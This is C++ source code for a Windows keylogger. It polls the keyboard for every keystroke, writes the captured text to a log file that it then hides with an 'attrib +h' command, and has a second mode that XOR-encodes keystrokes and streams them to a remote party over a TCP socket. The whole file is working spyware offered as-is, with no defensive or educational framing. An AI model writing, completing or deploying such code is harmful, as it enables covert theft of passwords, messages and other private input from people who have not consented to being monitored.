
#include "../inc/Keylogger.h"
#include "../inc/other.h"


Keylogger::Keylogger()
{
    ;
}


VOID Keylogger::setup()
{
    
    DWORD dwProcessId;
    a_WindowHandle =  GetForegroundWindow(); //Récupère un handle vers la fenêtre de premier plan
    a_dwThreadId = GetWindowThreadProcessId(a_WindowHandle, &dwProcessId); //Récupère l'identifiant du thread qui a créé la fenêtre spécifiée
    a_hkl = GetKeyboardLayout(a_dwThreadId); //Récupère l'identificateur de paramètres régionaux d'entrée actif (anciennement appelé disposition du clavier).
}


VOID Keylogger::setSocket(SOCKET &sock)
{
    a_sock = sock;
}


wstring Keylogger::specialKey(INT &keystroke)
{
    switch(keystroke)
    {
    //http://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
    case VK_SPACE:
        return L" ";
        
    case VK_SHIFT:
        return L"[SHIFT]";
                                                    
    case VK_RETURN:
        //return L"[ENTER]";
        return L"\n";
    case VK_BACK:
        return L"[BACKSPACE]";
        
    case VK_TAB:
        return L"[TAB]";
        
    case VK_CONTROL:
        return L"[CTRL]";
            
    case VK_DELETE:
        return L"[DEL]";
        
    case VK_OEM_1:
        return L"[;:]";
        
    case VK_OEM_2:
        return L"[/?]";
        
    case VK_OEM_3:
        return L"[`~]";
        
    case VK_OEM_4:
        return L"[ [{ ]";
            
    case VK_OEM_5:
        return L"[\\|]";
                                        
    case VK_OEM_6:
        return L"[ ]} ]";
        
    case VK_OEM_7:
        return L"['\"]";
        
    case VK_OEM_PLUS:
        return L"[=+]";
        
    case VK_OEM_COMMA:
        return L"[,<]";
        
    case VK_OEM_MINUS:
        return L"[-_]";
        
    case VK_OEM_PERIOD:
        return(L"[.>]");
        
    case VK_NUMPAD0:
        return L"0";
        
    case VK_NUMPAD1:
        return L"1";
        
    case VK_NUMPAD2:
        return L"2";
        
    case VK_NUMPAD3:
        return L"3";
        
    case VK_NUMPAD4:
        return L"4";
        
    case VK_NUMPAD5:
        return L"5";
        
    case VK_NUMPAD6:
        return L"6";
        
    case VK_NUMPAD7:
        return L"7";
        
    case VK_NUMPAD8:
        return L"8";
        
    case VK_NUMPAD9:
        return L"9";
        
    case VK_CAPITAL:
        return L"[CAPS LOCK]";
        
    case VK_PRIOR:
        return L"[PAGE UP]";
        
    case VK_NEXT:
        return L"[PAGE DOWN]";
        
    case VK_END:
        return L"[END]";
        
    case VK_HOME:
        return L"[HOME]";
        
    case VK_LWIN:
        return L"[WIN]";
        
    case VK_RWIN:
        return L"[WIN]";
        
    case VK_VOLUME_MUTE:
        return L"[SOUND-MUTE]";
        
    case VK_VOLUME_DOWN:
        return L"[SOUND-DOWN]";
        
    case VK_VOLUME_UP:
        return L"[SOUND-DOWN]";
        
    case VK_MEDIA_PLAY_PAUSE:
        return L"[MEDIA-PLAY/PAUSE]";
        
    case VK_MEDIA_STOP:
        return L"[MEDIA-STOP]";
        
    case VK_MENU:
        return L"[ALT]";
    
    default:
        return L""; //If the key and unknown or uninteresting 
    }
}


wstring Keylogger::intToUnicode(INT keystroke)
{
    BYTE kState[256]={0};
    WCHAR uni_key[16]={0};
    UINT virtual_key = keystroke;

    GetKeyboardState(kState); //Copie l'état des 256 clés virtuelles dans le tampon spécifié.
    
    ToUnicodeEx(virtual_key, keystroke, kState, uni_key, 32, 0, a_hkl);

    return (wstring) uni_key;
}


VOID Keylogger::directTcp()
{
    HANDLE threads[1];

    wcout << "In startThread " << endl;

    threads[0] = CreateThread(NULL,0 ,sendKeystrokeThread ,&a_sock ,0 ,NULL); //https://stackoverflow.com/questions/1372967/how-do-you-use-createthread-for-functions-which-are-class-members
    threads[1] = CreateThread(NULL,0 ,recvDataThread ,&a_sock ,0 ,NULL);

    //WaitForMultipleObjects(1,threads, TRUE, INFINITE); //https://stackoverflow.com/questions/43298052/windows-c-tcp-socket-sendrecv-at-the-same-time
    
    WaitForSingleObject(threads[1], INFINITE);
    
    TerminateThread(threads[0], 0); //Once the first thread is finished, finish the second. 

    CloseHandle(threads[0]);
    CloseHandle(threads[1]);
}


//-------------------------------------------------------------------------------------------------------------------
INT Keylogger::silenciousBackground()//return 1 if error
{
    /*
    Algo:
    1- (createHideFileAndHideFile)
        1.1- Test if exist.
        1.2- Set handle of the a_file_name.
        1.3- Hide a_file_name.
    2- (StaticThreadStart) Start thread.
        2.1- (keyboardListeningAndWriteFile)
        2.2- (writeKeystrokeInFile)
    */
   if(createHideFileAndHideFile())
   {
       //if error
        return 1;
   }
    HANDLE hThread  = CreateThread(NULL,0 ,silenciousThread ,this ,0 ,NULL);
    WaitForSingleObject(hThread, INFINITE); //just for test
    
    return 0;
}


DWORD WINAPI Keylogger::silenciousThread(LPVOID param) //https://stackoverflow.com/questions/1372967/how-do-you-use-createthread-for-functions-which-are-class-members
{
    Keylogger* This = (Keylogger *) param;
    //setup ?????
    wcout << "Handler in staticThreadStart: " << This->a_hFile << endl;
    This->keyboardListeningAndWriteFile(This->a_hFile);

    return 0;
}


VOID Keylogger::keyboardListeningAndWriteFile(CONST HANDLE &hFile)
{
    wcout << "Handle keyboardListeningAndWriteFile: " <<hFile << endl;
    wstring unicode_char;

    while(TRUE)
    {  
        for(INT keystroke=8; keystroke <= 222; keystroke++) //Test toute les touche
        {
            if(GetAsyncKeyState(keystroke) == -32767)
            {
                //if press key
                cout << keystroke << endl;
                if((keystroke>=39)&&(keystroke<91))
                {
                    //not SpecialKey
                    unicode_char = intToUnicode(keystroke);
                }
                else
                {
                    unicode_char = specialKey(keystroke);
                }
                wcout << "char: "<<unicode_char << endl;

                //writeKeystrokeInFile(XOREncryption(unicode_char), hFile);
                writeKeystrokeInFile(unicode_char, hFile);
            }
        }
    }
}


INT Keylogger::createHideFileAndHideFile() //return 1 if error
{
    HANDLE hFile; //use in CreateFile and WriteFile
    BOOL status; // use in WriteFile
    DWORD dwBytesWritten = 0; // use in WriteFile
    DWORD dwDesiredAccess;
    DWORD dwCreationDisposition; //use in CreateFilW
   
    if(checkIfFileExist((wstring)a_file_name))
    {
        //if exist
        wcout << "[+] file exist.\n" << endl;
        dwDesiredAccess = FILE_APPEND_DATA; // Automatically seek to the end of the file after creating/opening
        dwCreationDisposition = OPEN_ALWAYS; // Opens a file, always.
    }
    else
    {
        //file not exist
        wcout << "[-] File not  exist" << endl;
        dwDesiredAccess = GENERIC_WRITE;
        dwCreationDisposition = CREATE_NEW;
    }

    hFile = CreateFileW(a_file_name,  dwDesiredAccess,  0, NULL, dwCreationDisposition, FILE_ATTRIBUTE_NORMAL, NULL); //Crée ou ouvre un fichier ou un périphérique d'E / S. 
    wcout << "last error createfile: " << GetLastError() << endl;
    wcout << "CreateFile hFile: " << hFile << endl; 
    if(hFile == INVALID_HANDLE_VALUE)
    {
        //fatal error
        wcout << "FATAL ERROR in createHideFileAndHideFile" << endl;
        return 1;
    }
    else
    {
        wstring cmd = L"attrib +h " + (wstring)a_file_name; 
        wcout << "cmd: " << cmd << endl;
        _wsystem(cmd.c_str());
        wcout << "[?] File hide !!!" << endl;
        
        a_hFile = hFile; //set attribut
        return 0;
    }
}


VOID Keylogger::writeKeystrokeInFile(CONST wstring &keystroke, CONST HANDLE &hFile)
{
    WriteFile(          //https://stackoverflow.com/questions/28618715/c-writefile-unicode-characters
        hFile,           // open file handle
        ConvertWideToUtf8(keystroke).c_str(), // start of data to write
        keystroke.length(),  // number of bytes to write
        NULL, // number of bytes that were written
        NULL);           // no overlapped structure
    wcout << "write file good or not ? "<< GetLastError() << endl;
}


//-------------------------------------------------------------------------------------------------------------------
HANDLE Keylogger::gethFile()
{
    return a_hFile;
}


Keylogger::~Keylogger()
{wcout << "\n\nDestructorrrrrr\n\n" << endl;}


//----------------------------------------------------------------------------------
DWORD WINAPI sendKeystrokeThread(LPVOID param) //for directTcp
{   
    SOCKET sock = *(SOCKET *)param;
    wstring unicode_char;
    
    Keylogger keylogger;
    keylogger.setup();

    while (true)
    {
        Sleep(20);
    
        for(INT keystroke=8; keystroke <= 222; keystroke++) //Test toute les touche
        {
            if(GetAsyncKeyState(keystroke) == -32767)
            {
                cout << keystroke << endl;
                if((keystroke>=39)&&(keystroke<91))
                {
                    //not SpecialKey
                    unicode_char = keylogger.intToUnicode(keystroke);
                }
                else
                {
                    unicode_char = keylogger.specialKey(keystroke);
                }
                wcout << "char: "<<unicode_char << endl;
            }
            wcout << "send char: "<<unicode_char << endl;
            send(sock, (char *)XOREncryption(unicode_char).c_str(),unicode_char.length() * sizeof(WCHAR), 0);
        }
    }
    return 0;
}


DWORD WINAPI recvDataThread(LPVOID param)//waits to receive an end-of-connection message  for directTcp | for directTcp
{
    SOCKET sock = *(SOCKET *)param;

    WCHAR buff[512]={0};

    while(TRUE)
    {
        INT stat = recv(sock, (CHAR *)buff, sizeof(buff), 0);
        if(stat == SOCKET_ERROR)
        {
            wcout << "SOCKET_ERROR" << endl;
            break;
        }
        else if (XOREncryption( (wstring) buff) == L"\r\n")
        {
            break;
        }
        wcout << buff << endl;

        ZeroMemory(&buff, sizeof(buff));
    }

    wcout << "stop thread baby !" << endl;
    return 0;
}

